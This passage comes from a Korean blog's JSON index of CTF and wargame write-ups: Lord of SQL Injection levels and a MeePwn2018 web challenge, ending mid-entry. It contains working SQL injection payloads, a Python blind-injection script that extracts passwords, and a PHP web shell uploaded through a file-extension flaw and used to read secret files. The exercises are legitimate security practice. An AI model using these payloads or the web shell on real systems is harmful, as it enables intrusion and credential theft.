문자열 대신에 ||을 사용했다.or을 사용 할 경우에는 or id='admin 처럼 무조건 공백이 들어가야 하지만, ||는 공백 없이 ||id='admin을 해도 잘 동작하기 때문이다.문제를 풀기 위해 아래와 같이 입력 해 보았다.?pw=1'||id='admin역시 문제를 풀 수 있었다.-----------------------------------------------------------------------------------------------------query : select id from prob_wolfman where id='guest' and pw='1'||id='admin'-----------------------------------------------------------------------------------------------------Hello adminWOLFMAN Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/ /i', $_GET[pw])) exit(\"No whitespace ~_~\");   $query = \"select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"wolfman\");   highlight_file(__FILE__); ?&gt;WOLFMAN Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/24/los-wolfman.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-23-los-orc-html": {
        "title": "[Lord of SQL Injection] LoS - orc 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 23, 2018",
        "author": "",
        "category": "",
        "content": "하루에 한 문제씩 los 문제를 풀어보는 중이다.다음 문제의 이름은 orc이다.코드는 다음과 같다.-------------------------------------------------------------------------------query : select id from prob_orc where id='admin' and pw=''-------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_orc where id='admin' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello admin&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"orc\");   highlight_file(__FILE__); ?&gt;이번 문제에는 문제를 풀기 위해 아래의 조건문을 통과해야 한다.if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"orc\");입력 한 pw의 값과 데이터베이스에 저장되어 있는 pw의 값이 같아야 한다.즉, 정확한 pw의 값을 입력해야 문제를 풀 수 있다.이 문제는 Blind SQL Injection으로 해결했다.Blind SQL Injection은 쿼리 결과 에 따른 서버의 참과 거짓 반응을 통해 공격을 수행한다.이에 대해 이 전 블로그에 적어둔게 있는데, 지금은 옮기기 귀찮아서 나중에 시간이 될 때 옮겨오려 한다.문제를 풀기 위해 구현한 exploit 코드는 아래와 같다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1' or id='admin' and length(pw)=\" + str(i) + \"%23\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' or id='admin' and substr(pw, \" + str(j) + \", 1)='\" + chr(i)\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"먼저 pw의 길이를 알아내기 위해, length() 함수를 사용했다.이 경우 완성되는 쿼리는 다음과 같다.select id from prob_orc where id='admin' and pw='1' or id='admin' and length(pw)=0#'만약 pw의 길이가 str(i)의 값과 같을 경우 데이터베이스에서는 id='admin' and length(pw)=0의 두 조건이 모두 참이므로 admin의 행이 추출되어 Hello admin이 출력될 것이다.길이를 찾은 다음에는 해당 길이만큼 반복문을 수행 해 pw를 한 글자 씩 찾았다.substr()을 사용했는데, 이 경우 완성되는 쿼리는 다음과 같다.select id from prob_orc where id='admin' and pw='1' or id='admin' and substr(pw, 0, 1)='0'이 때도 만약 pw의 str(j)번 째 문자가 chr(i)의 값과 같을 경우 id='admin' and substr(pw, 0, 1)='0'의 모든 조건이 참이 되어 admin의 행이 추출된다.따라서 Hello admin이 출력된다.이 exploit 코드를 실행시킨 결과 다음과 같이 pw를 찾을 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 0[+] Found 2 : 09[+] Found 3 : 095[+] Found 4 : 095A[+] Found 5 : 095A9[+] Found 6 : 095A98[+] Found 7 : 095A985[+] Found 8 : 095A9852[+] Found password :  095A9852[+] End그런데, 095A9852를 입력해도 Hello admin은 출력되지만 문제는 풀리지 않았다.생각해보니 MySQL에서는 대소문자를 구분하지 않아 만약 a와 A를 비교해도 참을 반환한다는 것이 생각났다.그래서 대문자를 소문자로 바꾸어 다시 인증했더니 문제가 풀렸다.-------------------------------------------------------------------------------------------query : select id from prob_orc where id='admin' and pw='095a9852'-------------------------------------------------------------------------------------------Hello adminORC Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_orc where id='admin' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello admin&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"orc\");   highlight_file(__FILE__); ?&gt;ORC Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/23/los-orc.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-22-los-goblin-html": {
        "title": "[Lord of SQL Injection] LoS - goblin 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 22, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제는 goblin 문제이다.이번에는 password column 대신에 no column이 생겼다.코드는 다음과 같다.--------------------------------------------------------------------------------query : select id from prob_goblin where id='guest' and no=--------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'|\\\"|\\`/i', $_GET[no])) exit(\"No Quotes ~_~\");   $query = \"select id from prob_goblin where id='guest' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"goblin\");  highlight_file(__FILE__); ?&gt;no column이 새로 생겼으며, id가 guest로 고정되어 있다.또한 이번에는 '(싱글쿼터)를 입력할 수 없다.하지만 문제를 풀기 위해서는 id가 admin인 행을 추출해야 한다.where 절에서 id='guest'와 no=??의 두 조건은 and로 연결되어 있다.따라서 이를 이용 해 문제를 풀 수 있을 것 같다.데이터베이스에 아래와 같이 저장되어 있다고 가정 해 보자.            no      id                  0      guest              1      admin      이 경우, 만약 no 자리에 0이 있다면 결과적으로 where id='guest' and no={$_GET[no]}의 where 절은 참이 되므로 첫 번째 행이 추출 될 것이다.하지만 만약 no자리에 0이 아닌 값이 들어간다면 결과적으로 조건절은 거짓이 되어 아무런 결과 값을 가져오지 않는다.이 때, 만약 뒤에 아래와 같이 or로 묶인 조건이 추가적으로 있을 경우 뒤의 조건문을 실행하게 된다.where id='guest' and no=1 or no=1위의 where 절에서 id='guest'이고 no=1인 행이 없으므로, and로 묶여 있는 조건은 거짓이 된다.때문에 or뒤의 조건을 실행하게 되어 no=1인 행을 추출하게 된다.따라서 기존에 있던 조건 뒤에 추가적으로 조건을 삽입할 수 있다면 id가 guest가 아닌 행을 추출할 수 있다.먼저 문제를 풀기 위해 guest의 no가 무엇인지 확인하기 위해 no에 0, 1을 입력 해 보았다.---------------------------------------------------------------------------------query : select id from prob_goblin where id='guest' and no=1---------------------------------------------------------------------------------Hello guest&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'|\\\"|\\`/i', $_GET[no])) exit(\"No Quotes ~_~\");   $query = \"select id from prob_goblin where id='guest' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"goblin\");  highlight_file(__FILE__); ?&gt;그 결과 no가 1일 때 Hello guest가 출력되는 것을 확인할 수 있다.따라서 guest의 no는 1임을 알 수 있으며 추측할 수 있는 데이터베이스의 데이터는 다음과 같다.            no      id                  1      guest              1이 아닌 값      admin      즉, id가 admin인 행의 no는 1이 아닌 값으로 되어 있을 것이다.위에서 설명했다시피 다음과 같이 입력 해 and로 묶인 조건을 거짓으로 만드는 쿼리를 구성하면 id가 guest가 아닌 행을 추출할 수 있다.?no=0 or no=0따라서 id가 admin인 행을 추출하기 위해 or 뒤의 no 자리에 1이 아닌 값을 차례로 입력 해 보면 언젠가는 내가 원하는 행을 추출할 수 있을 것이다.0부터 입력해 본 결과, no가 2일 때 문제를 풀 수 있었다.---------------------------------------------------------------------------------------------query : select id from prob_goblin where id='guest' and no=0 or no=2---------------------------------------------------------------------------------------------Hello adminGOBLIN Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'|\\\"|\\`/i', $_GET[no])) exit(\"No Quotes ~_~\");   $query = \"select id from prob_goblin where id='guest' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"goblin\");  highlight_file(__FILE__); ?&gt;GOBLIN Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/22/los-goblin.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-21-los-cobolt-html": {
        "title": "[Lord of SQL Injection] LoS - cobolt 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 21, 2018",
        "author": "",
        "category": "",
        "content": "두 번째 문제는 cobolt이다.모든 문제의 이름이 괴물(?) 몬스터(?)의 이름인 것 같다.코드는 다음과 같다.----------------------------------------------------------------------------------query : select id from prob_cobolt where id='' and pw=md5('')----------------------------------------------------------------------------------&lt;?php  include \"./config.php\";   login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"cobolt\");  elseif($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;br&gt;You are not admin :(&lt;/h2&gt;\";   highlight_file(__FILE__); ?&gt;이번에는 pw를 쿼리에 넣을 때 md5로 해싱을 한다.때문에 이 전 문제처럼 pw에 인젝션을 해 문제를 풀 수 없다.문제를 풀기위한 조건도 좀 달라졌다.if($result['id'] == 'admin') solve(\"cobolt\");즉, 쿼리 결과로 나온 id가 admin이어야 문제를 풀 수 있다.어떻게 할 지 고민하다가 pw 검증 루틴을 아예 무시하도록 하는 방법을 사용했다.나는 주석을 사용했는데, 주석은 #이나 --를 사용한다.이 때, --를 사용할 때는 뒤에 꼭 공백이 있어야 한다.따라서 다음과 같은 두 가지 방법으로 문제를 풀 수 있다.1. ?id=admin'--%202. ?id=admin'%23공백과 #은 URL Encoding을 해서 넘겨주어야 한다.역시 이번에도 문제가 풀렸다.--------------------------------------------------------------------------------------------query : select id from prob_cobolt where id='admin'#' and pw=md5('')--------------------------------------------------------------------------------------------COBOLT Clear!&lt;?php  include \"./config.php\";   login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"cobolt\");  elseif($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;br&gt;You are not admin :(&lt;/h2&gt;\";   highlight_file(__FILE__); ?&gt;COBOLT Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/21/los-cobolt.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-20-los-gremlin-html": {
        "title": "[Lord of SQL Injection] LoS - gremlin 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 20, 2018",
        "author": "",
        "category": "",
        "content": "예전에 LoS 문제를 풀어본 적 있었다.이 때는 http://los.eagle-jump.org에서 풀었었는데, 원작자가 새로운 문제를 추가 해 서비스를 시작했다 해 다시 풀어보게 되었다.사이트 주소는 http://los.rubiya.kr 이다.LoS는 따로 플래그를 입력하는 방식이 아니라 코드 안의 solve() 함수가 동작하도록 하면 문제가 풀린다.그리고 친절하게 내가 입력 한 값이 어떻게 쿼리에 들어가는지도 보여준다.첫 번째 문제는 gremlin이다.코드는 다음과 같다.----------------------------------------------------------------------------query : select id from prob_gremlin where id='' and pw=''----------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\"); // do not try to attack another table, database!  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']) solve(\"gremlin\");  highlight_file(__FILE__);?&gt;문제를 풀기 위해서는 if($result['id']) solve(\"gremlin\");에서 조건문을 통과해야 한다.즉, 쿼리를 실행했을 때 추출되는 id 값이 있으면 된다.실행되는 쿼리는 다음과 같다.select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'이 때, id와 pw의 값은 GET 방식으로 받아온다.id가 뭐든 상관 없기때문에 그냥 쿼리 결과가 참이 될 수 있는 값을 입력하면 될 것 같다.쿼리문을 완성하기 위해 아래와 같이 입력했다.?id=admin&amp;pw=a' or 'a'='a그 결과 아래와 같이 문제를 풀 수 있었다.--------------------------------------------------------------------------------------------------query : select id from prob_gremlin where id='admin' and pw='a' or 'a' = 'a'--------------------------------------------------------------------------------------------------GREMLIN Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\"); // do not try to attack another table, database!  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']) solve(\"gremlin\");  highlight_file(__FILE__);?&gt;Gremlin Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/20/los-gremlin.html"
      }
      ,
    
      "ctf-2018-2018-07-18-ctf-meepwn2018-omegasector-html": {
        "title": "[MeePwn2018] OMEGASECTOR Write up",
        "tags": "Write-up, CTF, MeePwn2018",
        "date": "July 18, 2018",
        "author": "",
        "category": "",
        "content": "OMEGASECTOR 문제는 가장 오랜 시간 그렇다고 해도 길진 않았지만 고민했던 문제이다.역시나 대회 기간에는 풀지 못했다(ㅠㅠ).풀이를 보며 아 왜 난 이 생각을 못했었지! 한 점이 많아서 Write up을 작성 해 본다.문제 정보는 다음과 같다.Wtf !? I just want to go to OmegaSector but there is weird authentication here, please help mehttp://138.68.228.12/문제에 접속하면 아래와 같은 페이지가 있으며, 소스코드를 확인 해 보면 아래와 같다.베트남까지 메이플이 퍼졌나보다&lt;html&gt;&lt;style type=\"text/css\"&gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&lt;/style&gt;&lt;head&gt;  &lt;link rel=\"stylesheet\" href=\"assets/omega_sector.css\"&gt;  &lt;link rel=\"stylesheet\" href=\"assets/tsu_effect.css\"&gt;&lt;/head&gt;&lt;h2 id=\"intro\" class=\"neon\"&gt;Seems like you are not belongs to this place, please comeback to ludibrium!&lt;/h2&gt;&lt;img src=\"assets/map.jpg\" id=\"taxi\" width=\"55%\" height=\"55%\" /&gt;&lt;body background=\"assets/background.jpg\" class=\"cenback\"&gt;&lt;/body&gt;&lt;!-- is_debug=1 --&gt;&lt;!-- All images/medias credit goes to nexon, wizet --&gt;&lt;/html&gt;소스코드에서 보면 is_debug=1이라는 부분이 있다.때문에 http://138.68.228.12/?is_debug=1로 접속하면 소스코드를 확인할 수 있다.&lt;?php ob_start(); session_start(); ?&gt; &lt;html&gt; &lt;style type=\"text/css\"&gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&lt;/style&gt; &lt;head&gt;   &lt;link rel=\"stylesheet\" href=\"assets/omega_sector.css\"&gt;   &lt;link rel=\"stylesheet\" href=\"assets/tsu_effect.css\"&gt; &lt;/head&gt; &lt;?php ini_set(\"display_errors\", 0); include('secret.php'); $remote=$_SERVER['REQUEST_URI']; if(strpos(urldecode($remote),'..')) { mapl_die(); } if(!parse_url($remote, PHP_URL_HOST)) {     $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI']; } $whoareyou=parse_url($remote, PHP_URL_HOST); if($whoareyou===\"alien.somewhere.meepwn.team\") {     if(!isset($_GET['alien']))     {         $wrong = ' &lt;h2 id=\"intro\" class=\"neon\"&gt;You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!&lt;/h2&gt; &lt;h1 id=\"main\" class=\"shadow\"&gt;Are You ALIEN??&lt;/h1&gt; &lt;form id=\"main\"&gt;     &lt;button type=\"submit\" class=\"button-success\" name=\"alien\" value=\"Yes\"&gt;Yes&lt;/button&gt;     &lt;button type=\"submit\" class=\"button-error\" name=\"alien\" value=\"No\"&gt;No&lt;/button&gt; &lt;/form&gt; &lt;img src=\"assets/taxi.png\" id=\"taxi\" width=\"15%\" height=\"20%\" /&gt; ';         echo $wrong;     }     if(isset($_GET['alien']) and !empty($_GET['alien']))     {          if($_GET['alien']==='@!#$@!@@')         {             $_SESSION['auth']=hash('sha256', 'alien'.$salt);             exit(header( \"Location: alien_sector.php\" ));         }         else         {             mapl_die();         }     } } elseif($whoareyou===\"human.ludibrium.meepwn.team\") {          if(!isset($_GET['human']))     {         echo \"\";         $wrong = ' &lt;h2 id=\"intro\" class=\"neon\"&gt;hellu human, welcome to omega sector, please verify your credentials to get into the taxi!&lt;/h2&gt; &lt;h1 id=\"main\" class=\"shadow\"&gt;Are You Human?&lt;/h1&gt; &lt;form id=\"main\"&gt;     &lt;button type=\"submit\" class=\"button-success\" name=\"human\" value=\"Yes\"&gt;Yes&lt;/button&gt;     &lt;button type=\"submit\" class=\"button-error\" name=\"human\" value=\"No\"&gt;No&lt;/button&gt; &lt;/form&gt; &lt;img src=\"assets/taxi.png\" id=\"taxi\" width=\"15%\" height=\"20%\" /&gt; ';         echo $wrong;     }     if(isset($_GET['human']) and !empty($_GET['human']))     {          if($_GET['human']==='Yes')         {             $_SESSION['auth']=hash('sha256', 'human'.$salt);             exit(header( \"Location: omega_sector.php\" ));         }         else         {             mapl_die();         }     } } else {     echo '&lt;h2 id=\"intro\" class=\"neon\"&gt;Seems like you are not belongs to this place, please comeback to ludibrium!&lt;/h2&gt;';     echo '&lt;img src=\"assets/map.jpg\" id=\"taxi\" width=\"55%\" height=\"55%\" /&gt;';     if(isset($_GET['is_debug']) and !empty($_GET['is_debug']) and $_GET['is_debug']===\"1\")     {         show_source(__FILE__);     } } ?&gt; &lt;body background=\"assets/background.jpg\" class=\"cenback\"&gt; &lt;/body&gt; &lt;!-- is_debug=1 --&gt; &lt;!-- All images/medias credit goes to nexon, wizet --&gt; &lt;/html&gt; &lt;?php ob_end_flush(); ?&gt; 소스코드 분석 결과 REQUEST_URI를 parse_url 한 결과 domain의 값이 alien.somewhere.meepwn.team 혹은 human.ludibrium.meepwn.team여야 한다.또한 alien.somewhere.meepwn.team일 경우, 쿼리 스트링으로 ?alien=@!#$@!@@을 주어야 하며, human.ludibrium.meepwn.team일 경우에는 ?human=Yes를 주어야 한다.여기서, REQUEST_URI는 URL 중 / 뒤를 이야기 한다.예를 들어 URL이 http://example.com/index.php?a=123 일 경우, / 뒤의 index.php?a=123 만을 말한다.parse_url 함수에 취약점이 있을 것 같아 인터넷을 뒤져보던 중, 아래의 두 링크를 찾을 수 있었다.  https://www.hahwul.com/2017/09/web-hacking-new-attack-vectors-in.html  https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf여기에서 나온 기법을 바탕으로 다양하게 시도 해 보았지만 아무것도 성공할 수 없었다.그런데 대회 종료 후 공개된 Write up을 보니 다들 Burp Suite를 사용했다.왜 이 생각을 못했는지 정말 안타까웠다.Burp Suite를 실행시킨 후 헤더를 아래와 같이 조작하면 alien 혹은 human 페이지를 확인할 수 있다.다시 Burp Suite를 이용 해 아래의 값으로 헤더를 조작하면 alien_sector.php와 omega_sector.php도 확인할 수 있다.http://alien.somewhere.meepwn.team/?alien=%40%21%23%24%40%21%40%40http://human.ludibrium.meepwn.team/?human=Yes  alien_sector.php  omega_sector.php각각의 소스코드를 살펴보면 다음과 같다.  alien_sector.php&lt;html&gt;&lt;style type=\"text/css\"&gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&lt;/style&gt;&lt;head&gt;  &lt;link rel=\"stylesheet\" href=\"assets/omega_sector.css\"&gt;  &lt;link rel=\"stylesheet\" href=\"assets/tsu_effect.css\"&gt;&lt;/head&gt;&lt;div class=\"alien_language\"&gt;&lt;h2 id=\"intro\" class=\"neon\"&gt;Looks like the aliens aren't here, so please leave the message, they will come later.&lt;/h2&gt;&lt;/div&gt;&lt;form action=\"alien_sector.php\" method=\"POST\"&gt;&lt;textarea class=\"shadow\" id=\"main\" name=\"message\"&gt;&lt;/textarea&gt;&lt;input type='text' name='type' value='alien' hidden /&gt;&lt;button type=\"submit\" id=\"button\"&gt;&lt;div class=\"alien_language\"&gt;Save&lt;/div&gt;&lt;/button&gt;&lt;/form&gt;&lt;body background=\"assets/alien_sector.jpg\" class=\"cenback\"&gt;&lt;/body&gt;&lt;audio controls autoplay hidden&gt;  &lt;source src=\"assets/omegasector.mp3\" type=\"audio/mpeg\"&gt;&lt;/audio&gt;&lt;/html&gt;  omega_sector.php&lt;html&gt;&lt;style type=\"text/css\"&gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&lt;/style&gt;&lt;head&gt;  &lt;link rel=\"stylesheet\" href=\"assets/omega_sector.css\"&gt;  &lt;link rel=\"stylesheet\" href=\"assets/tsu_effect.css\"&gt;&lt;/head&gt;&lt;h2 id=\"intro\" class=\"neon\"&gt;Its MesoRangers Time!!!! Please cheer us via your letter ^_^&lt;/h2&gt;&lt;form action=\"omega_sector.php\" method=\"POST\"&gt;&lt;textarea class=\"shadow\" id=\"main\" name=\"message\"&gt;&lt;/textarea&gt;&lt;input type='text' name='type' value='human' hidden /&gt;&lt;button type=\"submit\" id=\"button\"&gt;Save&lt;/button&gt;&lt;/form&gt;&lt;img src=\"assets/mesoranger.png\" id=\"rangers\" /&gt;&lt;body background=\"assets/omega_sector.jpg\" class=\"cenback\"&gt;&lt;/body&gt;&lt;audio controls autoplay hidden&gt;  &lt;source src=\"assets/omegasector.mp3\" type=\"audio/mpeg\"&gt;&lt;/audio&gt;&lt;/html&gt;각각의 페이지에선 message를 남길 수 있다.message를 남길 경우, alien_sector.php에서는 alien_message/hash_value.alien으로, omega_sector.php에서는 human_message/hash_value.human으로 파일을 생성 해 준다.  alien_sector.php  omega_sector.php각 페이지에서 메시지를 생성할 때, 메시지 본문 뿐 아니라 type또 함께 전송되는 것을 확인할 수 있다.이는 각각 alien과 human으로, 각 페이지에서 생성되는 파일의 확장자와 동일하다는 것을 알 수 있다.만약 type을 abc로 바꾼다면, *_message/hash_value.abc로 바뀌어 저장된다.따라서 type은 파일의 확장자를 설정한다는 것을 알 수 있으며, type의 값을 php로 둔다면 해당 파일의 내용은 message가 되므로, 우리가 원하는 코드를 실행시킬 수 있다.그런데, alien_sector.php에서는 ?나 _ 등의 특수문자만 입력되고, 알파벳을 입력 할 경우에는 Uh huh? Wut is this language?를 출력한다.(참고로 alien_sector.php에서는 외계어로 출력되기 때문에, 개발자 도구나 Burp Suite를 이용 해 평문을 확인해야 한다.  )반면, omega_sector.php에서는 알파벳이 잘 입력 되지만, 특수문자를 입력 할 경우에는 Uh huh? Wut is this language?를 출력 한다.즉, 아래의 두 가지 방법 중 하나를 사용해 flag를 읽어야 한다.      특수문자만으로 내가 원하는 명령어를 실행시킨다.    특수문자 없이 알파멧 만으로 내가 원하는 명령어를 실행시킨다.  모든 소스코드는 특수문자 없이 구현하기가 매우 어렵다.따라서 와일드 카드 등을 이용 해 특수문자만으로 원하는 명령어를 실행시키는 것이 더 수월할 수 있다.때문에 alien_sector.php를 사용 해 문제를 풀기로 했다.그런데 나는 flag가 어디에 있는지 모르기 때문에 이를 손쉽게 탐색하기 위해서는 웹쉘을 업로드 하는 것이 편하다.만약 문자의 제한이 없다면 내가 업로드 할 웹쉘 코드는 다음과 같다.&lt;?php  system($_GET['a']);?&gt;이 경우, 쿼리 스트링으로 ?a=ls 혹은 ?a=cat flag 등을 전달 해 준다면 해당 값이 system 함수의 인자로 들어가 내가 원하는 명령어를 실행할 수 있게 된다.하지만 이 문제에서는 문자의 제한이 있으므로, 해당 코드를 특수문자로만 구현해야 한다.고민하던 중, 여기에서 방법을 찾을 수 있었다.코드를 보기 좋게 정리하면 다음과 같다.결과적으로 위의 함수는 아래와 같다.&lt;?=$_GET[_]($_GET[__]);따라서 해당 페이지에 접속한 후 ?_=system&amp;__=ls와 같이 인자를 넘겨 준다면, 결국 system(ls)가 되어 ls 명령어를 실행한다.즉, 내가 원하는 명령어를 자유롭게 실행시킬 수 있게된다.먼저 해당 문자열을 message에 적고, type은 php로 해 아래와 같이 파일을 생성 해 주었다.이 후 생성된 파일에 직접 접근하며, ?_=system&amp;__=ls를 쿼리스트링으로 넘겨주었다.그 결과, 아래와 같이 ls 명령어가 실행된 것을 확인할 수 있었다.현재 디렉토리인 alien_message 디렉토리에는 플래그로 보이는 값이 없어, 상위 디렉토리를 확인하기 위해 ?_=system&amp;__=ls ../를 쿼리스트링으로 넘겨주었다.그 결과 아래와 같은 파일들을 확인할 수 있었다.alien_messagealien_sector.phpassetshuman_messageindex.phpomega_sector.phpsecret.php그 중 가장 의심스로운 secret.php 파일을 확인하기 위해 ?_=system&amp;__=cat ../secret.php를 넘겨주었다.그 결과 이번에도 역시 주석에서 flag를 발견할 수 있었다.FLAG : MeePwnCTF{__133-221-333-123-111___}",
        "url": "//ctf/2018/2018/07/18/ctf-meepwn2018-omegasector.html"
      }
      ,
    
      "ctf-2018-2018-07-17-ctf-meepwn2018-writeup-html": {
        "title": "[MeePwn2018] WHITE SNOW, BLACK SHADOW / ESOR / EZCHALLZ Write up",
        "tags": "Write-up, CTF, MeePwn2018",
        "date": "July 17, 2018",
        "author": "",
        "category": "",
